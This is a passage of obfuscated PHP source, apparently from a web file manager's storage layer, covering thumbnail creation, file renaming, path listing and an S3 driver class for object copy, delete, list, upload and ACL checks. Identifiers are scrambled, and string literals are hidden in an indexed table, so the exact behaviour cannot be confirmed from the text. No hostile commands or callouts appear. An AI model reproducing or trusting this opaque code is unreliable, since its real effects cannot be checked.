$àÏÁÀÁĞ); } return IO::fileOut(KodIO::make($œ›ÙïÜ²), !1, $¾€ù·Ü£[$èÁñŒá[32]]); } $ºüô ˆİ = IO::fileNameExist($ö¨‚ûôŠ, $†™¢®ä¨); if ($ºüô ˆİ) { return IO::fileOut(KodIO::make($ºüô ˆİ), !1, $¾€ù·Ü£[$èÁñŒá[32]]); } if ($¸Şì¤à¿ > 1000) { $this->makeImageCover($ö¨‚ûôŠ, $ê©İ©Š, $†™¢®ä¨, $¸Şì¤à¿); $this->makeImageCover($ö¨‚ûôŠ, $ê©İ©Š, "\143\x6f\166\145\162\x5f{$ñ½êìÃ–}\137\x32\x35\60\56\x70\156\147", 250); $ºüô ˆİ = IO::fileNameExist($ö¨‚ûôŠ, $†™¢®ä¨); if ($ºüô ˆİ) { return IO::fileOut(KodIO::make($ºüô ˆİ), !1, $¾€ù·Ü£[$èÁñŒá[32]]); } die; } if (!kodIO::allowCover($¾€ù·Ü£)) { return $this->fileOut($ê©İ©Š, !1, $¾€ù·Ü£[$èÁñŒá[32]]); } $³îàå³† = Cache::get($†™¢®ä¨); if ($³îàå³† == $èÁñŒá[194] || $³îàå³† == $èÁñŒá[195]) { echo $³îàå³†; die; } Cache::set($†™¢®ä¨, $èÁñŒá[195], 60); $ıù›áë = array($ö¨‚ûôŠ, $¾€ù·Ü£[$èÁñŒá[87]], $†™¢®ä¨, $¸Şì¤à¿); $ÆåÎîú’ = $èÁñŒá[196] . $¾€ù·Ü£[$èÁñŒá[79]] . $èÁñŒá[197] . $†™¢®ä¨ . $èÁñŒá[198] . $¾€ù·Ü£[$èÁñŒá[32]] . $èÁñŒá[199] . $¾€ù·Ü£[$èÁñŒá[87]]; TaskQueue::add($èÁñŒá[200], $ıù›áë, $ÆåÎîú’, $†™¢®ä¨); } public function makeImageCover($—Ã¢ğ·Ã, $Ü¥—³ó÷, $óàÙº²˜, $öŒµÏ“¹) { $¬£÷Éã› =& $_SERVER[µÅ˜º…æ]; if (IO::fileNameExist($—Ã¢ğ·Ã, $óàÙº²˜)) { return $¬£÷Éã›[201]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $Á¼¸­ÛÅ = $this->getPathOuter($Ü¥—³ó÷); $áÃÓ˜ © = DATA_THUMB . $óàÙº²˜; del_file($áÃÓ˜ ©); $ùşô¶¨ = IO::copy($Á¼¸­ÛÅ, TEMP_FILES, !1, $óàÙº²˜); if (!@file_exists($ùşô¶¨)) { return $¬£÷Éã›[202]; } ImageThumb::createThumb($ùşô¶¨, $áÃÓ˜ ©, $öŒµÏ“¹, $öŒµÏ“¹ * 10); if (@file_exists($áÃÓ˜ ©)) { Cache::remove($óàÙº²˜); return IO::move($áÃÓ˜ ©, $—Ã¢ğ·Ã); } Cache::set($óàÙº²˜, $¬£÷Éã›[194], 600); del_file($áÃÓ˜ ©); return $¬£÷Éã›[203] . $ùşô¶¨ . $¬£÷Éã›[74]; } public function fileOutImageServer($îåàâá, $Í×›¢ÅÉ = 250) { $this->fileOutImage($îåàâá, $Í×›¢ÅÉ); } public function fileNameAuto($“ç‰È”³, $°ù›¡’¡, $Ûì€Ø¼ = REPEAT_RENAME, $ë¯¦÷ö  = false) { $¤Â¸¡ú¦ =& $_SERVER[µÅ˜º…æ]; $¢ÏŞêÈ  = $“ç‰È”³ === $¤Â¸¡ú¦[12] ? $°ù›¡’¡ : rtrim($“ç‰È”³, $¤Â¸¡ú¦[8]) . $¤Â¸¡ú¦[8] . $°ù›¡’¡; if ($Ûì€Ø¼ == REPEAT_REPLACE || !$this->exist($¢ÏŞêÈ ) || $ë¯¦÷ö  && $Ûì€Ø¼ != REPEAT_RENAME_FOLDER) { return $°ù›¡’¡; } if ($Ûì€Ø¼ == REPEAT_SKIP) { return !1; } $ıíŞ¹óÖ = $¤Â¸¡ú¦[10] . get_path_ext($°ù›¡’¡); $ıíŞ¹óÖ = $ıíŞ¹óÖ == $¤Â¸¡ú¦[10] || $ë¯¦÷ö  ? $¤Â¸¡ú¦[12] : $ıíŞ¹óÖ; $°«À§·Ã = 1; $·á øæ¤ = substr($°ù›¡’¡, 0, strlen($°ù›¡’¡) - strlen($ıíŞ¹óÖ)); $ïêØÌ¸ = $·á øæ¤ . "\50{$°«À§·Ã}\51{$ıíŞ¹óÖ}"; while ($this->exist(rtrim($“ç‰È”³, $¤Â¸¡ú¦[8]) . $¤Â¸¡ú¦[8] . $ïêØÌ¸)) { $ïêØÌ¸ = $·á øæ¤ . "\x28{$°«À§·Ã}\51{$ıíŞ¹óÖ}"; $°«À§·Ã++; } return $ïêØÌ¸; } private function fileNameAutoList($ÄŞ»®ë¾, $×êççùú, $˜¾¹„Èâ = false) { $ÅĞí¬ë† =& $_SERVER[µÅ˜º…æ]; $’èº ¶ñ = $this->listPath($ÄŞ»®ë¾, !0); $’èº ¶ñ = array_merge($’èº ¶ñ[$ÅĞí¬ë†[85]], $’èº ¶ñ[$ÅĞí¬ë†[86]]); $¹š½ƒê = array_to_keyvalue($’èº ¶ñ, $ÅĞí¬ë†[12], $ÅĞí¬ë†[32]); $ôØ½‹ò‡ = $ÅĞí¬ë†[10] . get_path_ext($×êççùú); $ôØ½‹ò‡ = $ôØ½‹ò‡ == $ÅĞí¬ë†[10] || $˜¾¹„Èâ ? $ÅĞí¬ë†[12] : $ôØ½‹ò‡; $¯ÙÎÖé· = substr($×êççùú, 0, strlen($×êççùú) - strlen($ôØ½‹ò‡)); $§¡Áôé = $¯ÙÎÖé· . "\50\x30\x29{$ôØ½‹ò‡}"; for ($èÜñ¯ = 1; $èÜñ¯ <= count($¹š½ƒê) + 1; $èÜñ¯++) { $§¡Áôé = $¯ÙÎÖé· . "\50{$èÜñ¯}\51{$ôØ½‹ò‡}"; if (!in_array_not_case($§¡Áôé, $¹š½ƒê)) { return $§¡Áôé; } } return $§¡Áôé; } public function listAllFiles($åÜÙÉ‘¨, $Ôéƒ”™Î) { $ÂéÓª” =& $_SERVER[µÅ˜º…æ]; if (empty($Ôéƒ”™Î)) { return array(); } $±Å¥Áà = array_keys($Ôéƒ”™Î); $‚‘–¯…â = array(); $åÜÙÉ‘¨ = trim($åÜÙÉ‘¨, $ÂéÓª”[8]); foreach ($Ôéƒ”™Î as $š´Ô => $á›º’À²) { $µÃ³¤ÁÙ = ltrim(substr(trim($š´Ô, $ÂéÓª”[8]), strlen($åÜÙÉ‘¨)), $ÂéÓª”[8]); if (substr($š´Ô, -1) == $ÂéÓª”[8]) { $µÃ³¤ÁÙ = rtrim($µÃ³¤ÁÙ, $ÂéÓª”[8]) . $ÂéÓª”[8]; } $‚‘–¯…â = array_merge($‚‘–¯…â, $this->slicePath($µÃ³¤ÁÙ)); } $ä×äŠúë = array(); foreach (array_unique($‚‘–¯…â) as $Úäµ·Ä•) { $Ä¢˜²± = array($ÂéÓª”[87] => $this->getPathOuter($ÂéÓª”[8] . $åÜÙÉ‘¨ . $ÂéÓª”[8] . $Úäµ·Ä•), $ÂéÓª”[78] => 1, $ÂéÓª”[79] => 0); if (substr($Úäµ·Ä•, -1) != $ÂéÓª”[8]) { $Ä¢˜²±[$ÂéÓª”[78]] = 0; $¢õöøš = $this->getPath($åÜÙÉ‘¨ . $ÂéÓª”[8] . $Úäµ·Ä•); if (isset($Ôéƒ”™Î[$¢õöøš])) { $¡¥Ø¡¢Ò = $Ôéƒ”™Î[$¢õöøš]; if (isset($¡¥Ø¡¢Ò[$ÂéÓª”[79]])) { $Ä¢˜²±[$ÂéÓª”[79]] = intval($¡¥Ø¡¢Ò[$ÂéÓª”[79]]); } if (isset($¡¥Ø¡¢Ò[$ÂéÓª”[204]])) { $Ä¢˜²±[$ÂéÓª”[88]] = intval($¡¥Ø¡¢Ò[$ÂéÓª”[204]]); } } } $ä×äŠúë[] = $Ä¢˜²±; } return $ä×äŠúë; } public function slicePath($š¯¦Òº³) { $¥ìğŒÊ® =& $_SERVER[µÅ˜º…æ]; $ú®­Äì§ = explode($¥ìğŒÊ®[8], trim($š¯¦Òº³, $¥ìğŒÊ®[8])); $ıâé¬ÊÒ = 0; do { ++$ıâé¬ÊÒ; $Œ·ÜÄ¨ş[] = implode($¥ìğŒÊ®[8], array_slice($ú®­Äì§, 0, $ıâé¬ÊÒ)) . $¥ìğŒÊ®[8]; } while ($ıâé¬ÊÒ < count($ú®­Äì§)); $Œ·ÜÄ¨ş[count($ú®­Äì§) - 1] = $š¯¦Òº³; return $Œ·ÜÄ¨ş; } public function getHost() { $˜¸ã¸Ãñ =& $_SERVER[µÅ˜º…æ]; $Õë³ğ„Ò = parse_url(trim($this->domain, $˜¸ã¸Ãñ[8])); $ÓëÈ©ªÕ = isset($Õë³ğ„Ò[$˜¸ã¸Ãñ[205]]) ? $Õë³ğ„Ò[$˜¸ã¸Ãñ[205]] : http_type(); $úÏ–¡ã‚ = isset($Õë³ğ„Ò[$˜¸ã¸Ãñ[206]]) ? $Õë³ğ„Ò[$˜¸ã¸Ãñ[206]] : $Õë³ğ„Ò[$˜¸ã¸Ãñ[87]]; if (isset($Õë³ğ„Ò[$˜¸ã¸Ãñ[207]])) { $úÏ–¡ã‚ .= $˜¸ã¸Ãñ[4] . $Õë³ğ„Ò[$˜¸ã¸Ãñ[207]]; } return $ÓëÈ©ªÕ . $˜¸ã¸Ãñ[208] . $úÏ–¡ã‚; } public function pathEncode($—¨‘æ¼) { $‰Èî‡ø =& $_SERVER[µÅ˜º…æ]; return str_replace($‰Èî‡ø[209], $‰Èî‡ø[8], rawurlencode($—¨‘æ¼)); } public function writeLog($¨‹ì®Ì = '', $Ú¯¿’İ´ = false) { $ûÊğÆ =& $_SERVER[µÅ˜º…æ]; $¶úîÚõ† = in_array(ACTION, array($ûÊğÆ[210], $ûÊğÆ[211])); if (!$¶úîÚõ† && !GLOBAL_DEBUG) { return; } $ÁçÕçîç = $¨‹ì®Ì; static $ÛÊÏêõ­ = null; if (!$ÛÊÏêõ­) { $ÛÊÏêõ­ = strtoupper($this->getType()); } $¨‹ì®Ì = $ÛÊÏêõ­ . $ûÊğÆ[212] . $¨‹ì®Ì; if ($Ú¯¿’İ´) { $„³Î¯ = error_get_last(); if ($„³Î¯) { $¨‹ì®Ì = array($¨‹ì®Ì, $„³Î¯); } } write_log($¨‹ì®Ì, $ûÊğÆ[213]); if ($¶úîÚõ†) { throw new Exception($ÁçÕçîç); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($ñ¯÷›ığ) { set_timeout(); require_once SDK_DIR . $_SERVER[µÅ˜º…æ][214]; parent::__construct(); $this->_init($ñ¯÷›ığ); } public function _init($¢Î“Ç ä) { $¿éÅ£ÙÊ =& $_SERVER[µÅ˜º…æ]; $this->config = $¢Î“Ç ä; foreach ($¢Î“Ç ä as $¬™ÉõâÛ => $ŠŠõÎÈ›) { if (isset($this->{$¬™ÉõâÛ})) { $this->{$¬™ÉõâÛ} = $ŠŠõÎÈ›; } } $this->endpoint = $¢Î“Ç ä[$¿éÅ£ÙÊ[215]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $ ƒğ¼Ö¡ = $this->getHost(); if (!get_url_scheme($this->endpoint) && substr($ ƒğ¼Ö¡, 0, 7) == $¿éÅ£ÙÊ[216]) { $ ƒğ¼Ö¡ = $¿éÅ£ÙÊ[217] . substr($ ƒğ¼Ö¡, 7); } $this->client->setEndpoint($ ƒğ¼Ö¡); if (in_array(ACTION, array($¿éÅ£ÙÊ[210], $¿éÅ£ÙÊ[211]))) { $this->client->setExceptions(); } } public function setSignVersion($šÛˆÅüÔ = "\x76\64") { $this->signVer = $šÛˆÅüÔ; $this->client->setSignVersion($šÛˆÅüÔ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $û¥âå‘) { return null; } } public function isBucketCors() { $Ä¦ª”« =& $_SERVER[µÅ˜º…æ]; $ñµïº¥ó = $this->getBucketCors(); if (!$ñµïº¥ó || !is_array($ñµïº¥ó)) { return !1; } if (!is_array($ñµïº¥ó[$Ä¦ª”«[218]])) { $ñµïº¥ó[$Ä¦ª”«[218]] = explode($Ä¦ª”«[50], $ñµïº¥ó[$Ä¦ª”«[218]]); } if ($ñµïº¥ó[$Ä¦ª”«[219]] != $Ä¦ª”«[220] || !in_array($Ä¦ª”«[220], $ñµïº¥ó[$Ä¦ª”«[218]])) { return !1; } $š®µÌ‘ = array_map($Ä¦ª”«[221], $ñµïº¥ó[$Ä¦ª”«[222]]); if (!is_array($š®µÌ‘)) { $š®µÌ‘ = array(); } $ü¡ú•ã = array($Ä¦ª”«[223], $Ä¦ª”«[224], $Ä¦ª”«[225], $Ä¦ª”«[226], $Ä¦ª”«[227]); $öÉÙ¬È… = array_diff($ü¡ú•ã, $š®µÌ‘); return empty($öÉÙ¬È…); } public function getBktRegion() { return $this->client->getBucketRegion($this->bucket); } public function setRegion($Ÿ€÷ÍªÏ) { return $this->client->setRegion($Ÿ€÷ÍªÏ); } public function mkfile($€à–½¢ö, $Ú˜‹Š»¡ = '', $§“–…Ş¬ = REPEAT_RENAME) { $İ½ùÀı = $this->setContent($€à–½¢ö, $Ú˜‹Š»¡); if ($İ½ùÀı !== !1) { return $this->getPathOuter($€à–½¢ö); } return !1; } public function mkdir($ïĞ‹Çå, $¼ğ·˜ŸÓ = REPEAT_SKIP) { $¤‚ºúÙÍ =& $_SERVER[µÅ˜º…æ]; if (empty($ïĞ‹Çå) && $ïĞ‹Çå !== $¤‚ºúÙÍ[228]) { return !1; } if ($¼ğ·˜ŸÓ && $this->_isFolder($ïĞ‹Çå)) { return $this->getPathOuter($ïĞ‹Çå); } $İËÄóÖí = $this->setContent($ïĞ‹Çå, $¤‚ºúÙÍ[12], !0); if ($İËÄóÖí !== !1) { return $this->getPathOuter($ïĞ‹Çå); } return !1; } public function copyFile($á´¯êÅĞ, $íœÊşê, $Ñ‰îçÃÌ = array()) { $ÙÙâŠ•ì =& $_SERVER[µÅ˜º…æ]; $­¼ûº Ï = $this->objectMeta($á´¯êÅĞ); if (!$­¼ûº Ï) { return !1; } if ($­¼ûº Ï[$ÙÙâŠ•ì[79]] <= 1024 * 1024 * 200) { $ªŸĞ†¡Ú = $this->client->copyObject($this->bucket, $á´¯êÅĞ, $this->bucket, $íœÊşê, $ÙÙâŠ•ì[229], $Ñ‰îçÃÌ); } else { $ªŸĞ†¡Ú = $this->client->multiCopyObject($this->bucket, $á´¯êÅĞ, $this->bucket, $íœÊşê, $Ñ‰îçÃÌ); } $ªŸĞ†¡Ú = $ªŸĞ†¡Ú ? $this->getPathOuter($íœÊşê) : !1; return $ªŸĞ†¡Ú; } public function moveFile($‚ÍÇ‰¸·, $Ó›ë«») { if ($this->copyFile($‚ÍÇ‰¸·, $Ó›ë«»)) { $this->delFile($‚ÍÇ‰¸·); return $this->getPathOuter($Ó›ë«»); } return !1; } public function delFile($ñ’„¿ÍÎ) { return $this->client->deleteObject($this->bucket, $ñ’„¿ÍÎ); } public function delFolder($â´×Â¿™) { $ú„áËĞ§ =& $_SERVER[µÅ˜º…æ]; if (!$this->exist($â´×Â¿™)) { return !0; } $this->listItemCache = !1; $²©Éßöı = $this->fileList($â´×Â¿™); $this->listItemCache = !0; $¡¹Üˆê = trim($â´×Â¿™, $ú„áËĞ§[8]) . $ú„áËĞ§[8]; if (!empty($â´×Â¿™) && $â´×Â¿™ !== $ú„áËĞ§[228] && !in_array($¡¹Üˆê, $²©Éßöı[$ú„áËĞ§[85]])) { $²©Éßöı[$ú„áËĞ§[85]][] = $¡¹Üˆê; } $¦Üï»âÊ = $this->delByBatch($²©Éßöı[$ú„áËĞ§[86]]); if (!$¦Üï»âÊ) { return !1; } $¦Üï»âÊ = $this->delByBatch($²©Éßöı[$ú„áËĞ§[85]]); if (!$¦Üï»âÊ) { return !1; } return $this->delFile($¡¹Üˆê); } private function delByBatch($äæîİ×İ) { foreach (array_chunk($äæîİ×İ, 1000) as $Ü®§ÕÚã) { $“ºçõ¾’ = $this->client->deleteObjects($this->bucket, $Ü®§ÕÚã); if (!$“ºçõ¾’) { return !1; } } return !0; } public function rename($‹Ğç½ş, $“–¿´šš) { return $this->renameObject($‹Ğç½ş, $“–¿´šš); } public function listPath($·êÏ²£©, $–ÈùÍ­ª = false) { $¨¦Ñã±æ =& $_SERVER[µÅ˜º…æ]; $ØÌĞÚÛÜ = $this->fileList($·êÏ²£©, $¨¦Ñã±æ[8], !0); foreach ($ØÌĞÚÛÜ[$¨¦Ñã±æ[85]] as $¼²ÚÄğ‹ => $½àÜİÖÄ) { $ØÌĞÚÛÜ[$¨¦Ñã±æ[85]][$¼²ÚÄğ‹] = $this->folderInfo($½àÜİÖÄ, $–ÈùÍ­ª, $½àÜİÖÄ); } foreach ($ØÌĞÚÛÜ[$¨¦Ñã±æ[86]] as $¼²ÚÄğ‹ => $½àÜİÖÄ) { $ØÌĞÚÛÜ[$¨¦Ñã±æ[86]][$¼²ÚÄğ‹] = $this->fileInfo($½àÜİÖÄ[$¨¦Ñã±æ[32]], $–ÈùÍ­ª, $½àÜİÖÄ); } return $ØÌĞÚÛÜ; } protected function infoChildren($Êõ¸å´³, &$è¨àÛá) { $×û¦‹¬‹ =& $_SERVER[µÅ˜º…æ]; $´§úÇö = $this->fileList($Êõ¸å´³, $×û¦‹¬‹[12], !0); $è¨àÛá[$×û¦‹¬‹[81]] += count($´§úÇö[$×û¦‹¬‹[85]]); $è¨àÛá[$×û¦‹¬‹[80]] += count($´§úÇö[$×û¦‹¬‹[86]]); foreach ($´§úÇö[$×û¦‹¬‹[86]] as $İöÊ˜×‘) { if (!$İöÊ˜×‘ || !$İöÊ˜×‘[$×û¦‹¬‹[79]]) { continue; } $è¨àÛá[$×û¦‹¬‹[79]] += $İöÊ˜×‘[$×û¦‹¬‹[79]]; } } private function fileInfo($Ò¡µù§Ñ, $„ô×ÌØü = false, $ËÑÂ€ìè = array()) { $¿í×ÂÉ° =& $_SERVER[µÅ˜º…æ]; $°µçæŒç = array($¿í×ÂÉ°[32] => $this->pathThis($Ò¡µù§Ñ), $¿í×ÂÉ°[87] => $this->getPathOuter($Ò¡µù§Ñ), $¿í×ÂÉ°[33] => $¿í×ÂÉ°[230], $¿í×ÂÉ°[166] => $this->ext($Ò¡µù§Ñ), $¿í×ÂÉ°[79] => isset($ËÑÂ€ìè[$¿í×ÂÉ°[79]]) ? $ËÑÂ€ìè[$¿í×ÂÉ°[79]] : 0); if ($„ô×ÌØü) { return $°µçæŒç; } $°µçæŒç[$¿í×ÂÉ°[231]] = $°µçæŒç[$¿í×ÂÉ°[88]] = 0; $°µçæŒç[$¿í×ÂÉ°[232]] = $°µçæŒç[$¿í×ÂÉ°[233]] = !0; if (empty($ËÑÂ€ìè)) { $ËÑÂ€ìè = $this->objectMeta($Ò¡µù§Ñ); if (!$ËÑÂ€ìè) { return $°µçæŒç; } } if (isset($ËÑÂ€ìè[$¿í×ÂÉ°[234]]) && $ËÑÂ€ìè[$¿í×ÂÉ°[234]]) { $°µçæŒç[$¿í×ÂÉ°[235]] = $ËÑÂ€ìè[$¿í×ÂÉ°[234]]; } if (isset($ËÑÂ€ìè[$¿í×ÂÉ°[204]])) { $°µçæŒç[$¿í×ÂÉ°[88]] = $ËÑÂ€ìè[$¿í×ÂÉ°[204]]; } if (isset($ËÑÂ€ìè[$¿í×ÂÉ°[79]])) { $°µçæŒç[$¿í×ÂÉ°[79]] = $ËÑÂ€ìè[$¿í×ÂÉ°[79]]; } return $°µçæŒç; } private function folderInfo($¬‘ôíÜ, $¢ğÏúŠè = false, $¡ôÍŸ’¶ = array()) { $­şí¢ş½ =& $_SERVER[µÅ˜º…æ]; $ÇË´¥¸ = array($­şí¢ş½[32] => $this->pathThis($¬‘ôíÜ), $­şí¢ş½[87] => $this->getPathOuter($­şí¢ş½[8] . $¬‘ôíÜ), $­şí¢ş½[33] => $­şí¢ş½[78]); if ($¢ğÏúŠè) { return $ÇË´¥¸; } $ÇË´¥¸[$­şí¢ş½[231]] = $ÇË´¥¸[$­şí¢ş½[88]] = 0; $ÇË´¥¸[$­şí¢ş½[232]] = $ÇË´¥¸[$­şí¢ş½[233]] = !0; if ($¬‘ôíÜ == $­şí¢ş½[12]) { return $ÇË´¥¸; } if (empty($¡ôÍŸ’¶)) { $¡ôÍŸ’¶ = $this->objectMeta(trim($¬‘ôíÜ, $­şí¢ş½[8]) . $­şí¢ş½[8]); } if (isset($¡ôÍŸ’¶[$­şí¢ş½[204]])) { $ÇË´¥¸[$­şí¢ş½[231]] = $¡ôÍŸ’¶[$­şí¢ş½[204]]; } return $ÇË´¥¸; } private function fileList($³•’ÍÆ», $¾¯¢ú³ = '', $æ³Ó‰úá = 0) { $Îñ€ØÏú =& $_SERVER[µÅ˜º…æ]; $•Îè—Œ = rtrim($³•’ÍÆ», $Îñ€ØÏú[8]) . $Îñ€ØÏú[8]; $»‹îº = $this->listObjs($•Îè—Œ, null, null, $¾¯¢ú³); if (!$»‹îº) { return array($Îñ€ØÏú[85] => array(), $Îñ€ØÏú[86] => array()); } $¿¹Œ¦ˆ = $¥Ÿú’®¦ = array(); foreach ($»‹îº[$Îñ€ØÏú[236]] as $ôŸ¤†ßÒ) { $ëûª¡º = $ôŸ¤†ßÒ[$Îñ€ØÏú[32]]; if ($ëûª¡º == $•Îè—Œ) { continue; } $äå¨ıÜ = isset($ôŸ¤†ßÒ[$Îñ€ØÏú[79]]) ? $ôŸ¤†ßÒ[$Îñ€ØÏú[79]] : 0; $›Öµåİã = $äå¨ıÜ == 0 && substr($ëûª¡º, strlen($ëûª¡º) - 1, 1) == $Îñ€ØÏú[8] ? !0 : !1; $this->cacheMethodInfoSet($ëûª¡º, $›Öµåİã, $ôŸ¤†ßÒ); if ($›Öµåİã) { $¿¹Œ¦ˆ[] = $ëûª¡º; continue; } $¥Ÿú’®¦[] = $æ³Ó‰úá ? $ôŸ¤†ßÒ : $ëûª¡º; } foreach ($»‹îº[$Îñ€ØÏú[237]] as $ôŸ¤†ßÒ) { $¿¹Œ¦ˆ[] = $ôŸ¤†ßÒ[$Îñ€ØÏú[32]]; $this->cacheMethodInfoSet($ôŸ¤†ßÒ[$Îñ€ØÏú[32]], !0); } $this->cacheMethodInfoSet($³•’ÍÆ», !0); return array($Îñ€ØÏú[85] => $¿¹Œ¦ˆ, $Îñ€ØÏú[86] => $¥Ÿú’®¦); } private function listObjs($Ëíµê³Ÿ, $ÆèÔˆ´ı = null, $æä€±æ = null, $®‡‹Ÿ½ó = null) { $÷—šƒı =& $_SERVER[µÅ˜º…æ]; $Ëíµê³Ÿ = trim($Ëíµê³Ÿ, $÷—šƒı[8]); $×¼®²ôŠ = empty($Ëíµê³Ÿ) && $Ëíµê³Ÿ !== $÷—šƒı[228] ? $÷—šƒı[12] : $Ëíµê³Ÿ . $÷—šƒı[8]; return $this->client->getBucket($this->bucket, $×¼®²ôŠ, $ÆèÔˆ´ı, $æä€±æ, $®‡‹Ÿ½ó, !0); } public function has($ç‹—ÈÜØ, $»íóšÒ = false, $¥ı²¶«£ = true) { $˜”ìÀ“ =& $_SERVER[µÅ˜º…æ]; $ç‹—ÈÜØ = trim($ç‹—ÈÜØ, $˜”ìÀ“[8]); $§âû°šú = empty($ç‹—ÈÜØ) && $ç‹—ÈÜØ !== $˜”ìÀ“[228] ? $˜”ìÀ“[12] : $ç‹—ÈÜØ . $˜”ìÀ“[8]; $ºø•ï¾ß = null; $ì…Õ¦™ = 500; $„ÊÖŸÙ = $˜”ìÀ“[8]; $‰Ÿ€±ª = $Û‘éä¯ë = array(); while (!0) { $™â³ïà« = $this->listObjs($ç‹—ÈÜØ, $ºø•ï¾ß, $ì…Õ¦™, $„ÊÖŸÙ); if (!$™â³ïà«) { break; } $ºø•ï¾ß = $™â³ïà«[$˜”ìÀ“[238]]; $Ò¥©Ï§³ = $™â³ïà«[$˜”ìÀ“[236]]; $™•ßÙî­ = $™â³ïà«[$˜”ìÀ“[237]]; if (empty($Ò¥©Ï§³) && empty($™•ßÙî­)) { break; } if (count($Ò¥©Ï§³) == 1 && $Ò¥©Ï§³[0][$˜”ìÀ“[32]] == $§âû°šú) { break; } if ($»íóšÒ) { if (count($Ò¥©Ï§³)) { $Ò¥©Ï§³ = array_column($Ò¥©Ï§³, $˜”ìÀ“[32]); $‰Ÿ€±ª = array_merge($‰Ÿ€±ª, $Ò¥©Ï§³); } if (count($™•ßÙî­)) { $™•ßÙî­ = array_column($™•ßÙî­, $˜”ìÀ“[32]); $Û‘éä¯ë = array_merge($Û‘éä¯ë, $™•ßÙî­); } if ($ºø•ï¾ß === null) { break; } continue; } if ($¥ı²¶«£) { if (!empty($Ò¥©Ï§³)) { if (count($Ò¥©Ï§³) > 1 || isset($Ò¥©Ï§³[0][$˜”ìÀ“[32]]) && $Ò¥©Ï§³[0][$˜”ìÀ“[32]] != $§âû°šú) { return !0; } } } else { if (!empty($™•ßÙî­)) { return !0; } } if ($ºø•ï¾ß === null) { break; } } if ($»íóšÒ) { $‰Ÿ€±ª = array_diff($‰Ÿ€±ª, array($§âû°šú)); $‰Ÿ€±ª = count(array_unique($‰Ÿ€±ª)); $Û‘éä¯ë = count(array_unique($Û‘éä¯ë)); return array($˜”ìÀ“[239] => $‰Ÿ€±ª, $˜”ìÀ“[240] => $Û‘éä¯ë); } return !1; } public function listAll($Ãï‹Ë÷¢) { $ŠìÂ«ğÏ =& $_SERVER[µÅ˜º…æ]; $š¬ı‰ = $this->fileList($Ãï‹Ë÷¢, $ŠìÂ«ğÏ[12], !0); $‰è•“Ü÷ = array_to_keyvalue($š¬ı‰[$ŠìÂ«ğÏ[86]], $ŠìÂ«ğÏ[32]); foreach ($š¬ı‰[$ŠìÂ«ğÏ[85]] as $Ù©ì”²¹) { if (is_string($Ù©ì”²¹)) { $‰è•“Ü÷[$Ù©ì”²¹] = array($ŠìÂ«ğÏ[79] => 0); } } return $this->listAllFiles($Ãï‹Ë÷¢, $‰è•“Ü÷); } public function canRead($Ü»í¤ŞË) { $¥ÏÅŸÑÑ =& $_SERVER[µÅ˜º…æ]; $ÉÓµÓÓ‹ = $this->client->getAccessControlPolicy($this->bucket, $Ü»í¤ŞË); if (!$ÉÓµÓÓ‹) { return !1; } return in_array($ÉÓµÓÓ‹, array($¥ÏÅŸÑÑ[241], $¥ÏÅŸÑÑ[242], $¥ÏÅŸÑÑ[243])) ? !0 : !1; } public function canWrite($Ú¹ï–£®) { $í´çÊ¶Ø =& $_SERVER[µÅ˜º…æ]; $ºÁ­ãĞ = $this->client->getAccessControlPolicy($this->bucket, $Ú¹ï–£®); if (!$ºÁ­ãĞ) { return !1; } return in_array($ºÁ­ãĞ, array($í´çÊ¶Ø[241], $í´çÊ¶Ø[242])) ? !0 : !1; } public function getContent($ŸÊùéæş) { return $this->client->getObject($this->bucket, $ŸÊùéæş); } public function setContent($ƒ°¸ıŒ¨, $°•„Öù‘ = '', $Âéšü—Ã = false) { $‚É©£ÂË =& $_SERVER[µÅ˜º…æ]; $ƒ°¸ıŒ¨ = $Âéšü—Ã ? trim($ƒ°¸ıŒ¨, $‚É©£ÂË[8]) . $‚É©£ÂË[8] : $ƒ°¸ıŒ¨; $‰–è€Ş• = get_file_mime(get_path_ext($ƒ°¸ıŒ¨)); $×ÎŞã¢Â = $this->client->putObject($°•„Öù‘, $this->bucket, $ƒ°¸ıŒ¨, $‚É©£ÂË[229], array(), $‰–è€Ş•); if (!$×ÎŞã¢Â) { return !1; } if ($Âéšü—Ã) { return !0; } return $×ÎŞã¢Â ? !0 : !1; } public function fileSubstr($ùÈÚ“‰ , $¬àØØ, $¬†ã…˜) { $ ã°Ÿ—µ = $¬àØØ + $¬†ã…˜ - 1; return $this->client->getObject($this->bucket, $ùÈÚ“‰ , array($_SERVER[µÅ˜º…æ][244] => "\142\x79\x74\145\x73\75{$¬àØØ}\x2d{$ ã°Ÿ—µ}")); } public function upload($¦åĞÑ‰Ù, $‹Õ°±ËÑ, $ºÈÕŸå = false, $¢¥ş…ÅÖ = REPEAT_REPLACE) { $Û¸ŠŒçù =& $_SERVER[µÅ˜º…æ]; if (!$‹Õ°±ËÑ || !@file_exists($‹Õ°±ËÑ)) { return !1; } $ƒÂ¢€Ò = array($Û¸ŠŒçù[245] => @md5_file($‹Õ°±ËÑ)); $Îæ¨½ú  = array($Û¸ŠŒçù[246] => get_file_mime(get_path_ext($¦åĞÑ‰Ù))); if (IO::size($‹Õ°±ËÑ) <= 1024 * 1024 * 200) { $…Œê¦„ì = $this->client->putObjectFile($‹Õ°±ËÑ, $this->bucket, $¦åĞÑ‰Ù, $Û¸ŠŒçù[229], $ƒÂ¢€Ò, $Îæ¨½ú ); return !empty($…Œê¦„ì) ? $this->getPathOuter($¦åĞÑ‰Ù) : !1; } $ŒšÈÉò = $this->client->multiUploadObject($‹Õ°±ËÑ, $this->bucket, trim($¦åĞÑ‰Ù, $Û¸ŠŒçù[8]), $ƒÂ¢€Ò, $Îæ¨½ú ); return $ŒšÈÉò ? $this->getPathOuter($¦åĞÑ‰Ù) : !1; } public function download($¢©ı¥»×, $ÛÀ¶…ğì) { if (!@is_dir($this->pathFather($ÛÀ¶…ğì)) && !IO::mkdir($this->pathFather($ÛÀ¶…ğì))) { return !1; } $çíÙèÁ– = $this->client->getObject($this->bucket, $¢©ı¥»×, array(), 